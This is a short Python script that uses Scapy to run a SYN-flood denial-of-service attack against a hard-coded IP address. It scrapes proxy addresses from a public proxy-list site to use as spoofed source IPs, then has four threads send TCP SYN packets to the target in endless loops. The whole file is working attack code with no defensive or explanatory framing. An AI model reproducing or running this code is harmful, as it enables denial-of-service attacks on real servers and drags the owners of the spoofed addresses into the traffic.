from scapy.all import *
import threading
import time

from firstsource import getHeader,getHtml,getIpAddr

ip_list=[]

conf.verb=0
conf.interface='eth0'

class Attack_Thread(threading.Thread):
    global ip_list
    def __init__(self,num):
        super(Attack_Thread,self).__init__()
        self.stopped=False
        self.num=num
    def run(self):
        def attack(url='67.229.142.4'):
            packet=IP(src=ip_list,dst=url)/TCP(flags='S')
            while True:
                print 'start a round:%s' % self.num
                send(packet)
                print 'end:%s' % self.num
        sub=threading.Thread(target=attack,args=())
        sub.setDaemon(True)
        sub.start()

        while not self.stopped:
            sub.join(1)
    def stop(self):
        self.stopped=True

def prepare():
    global ip_list
    getHeader(u'header_xici.txt')
    websites=[u'http://www.xicidaili.com/',u'http://www.xicidaili.com/nn/',u'http://www.xicidaili.com/nt/',u'http://www.xicidaili.com/wn/',u'http://www.xicidaili.com/wt/']
    for website in websites:
        html=getHtml(website)
        ip_list.extend(getIpAddr(html))

def main():
    prepare()
    threads=[Attack_Thread(1),Attack_Thread(2),Attack_Thread(3),Attack_Thread(4)]
    for thread in threads:
        thread.start()
    time.sleep(1)
    for thread in threads:
        thread.stop()

if __name__=='__main__':
    main()
